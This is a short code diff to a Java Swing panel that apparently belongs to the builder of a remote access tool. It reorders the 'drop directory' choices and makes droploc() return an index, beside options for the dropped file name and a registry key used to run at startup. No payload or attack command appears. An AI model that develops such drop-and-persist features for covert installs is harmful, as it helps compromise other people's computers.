@@ -39,8 +39,8 @@ public class PanelBuildStartup extends JPanel {
 		return chckbxStartServerWith.isSelected();
 	}
 
-	public String droploc() {
-		return comboBox.getSelectedItem().toString().toLowerCase();
+	public int droploc() {
+		return comboBox.getSelectedIndex();
 	}
 	
 	public boolean runNext() {
@@ -79,7 +79,7 @@ public class PanelBuildStartup extends JPanel {
 
 		comboBox = new JComboBox<String>();
 		comboBox.setToolTipText("Drop directory");
-		comboBox.setModel(new DefaultComboBoxModel<String>(new String[] { "appdata", "root/C drive", "temp/documents (UNIX)", "desktop" }));
+		comboBox.setModel(new DefaultComboBoxModel<String>(new String[] { "root/C drive", "temp/documents (UNIX)", "appdata", "desktop" }));
 
 		JLabel lblDroppedFileAnd = new JLabel("Dropped file and reg key name:");
 
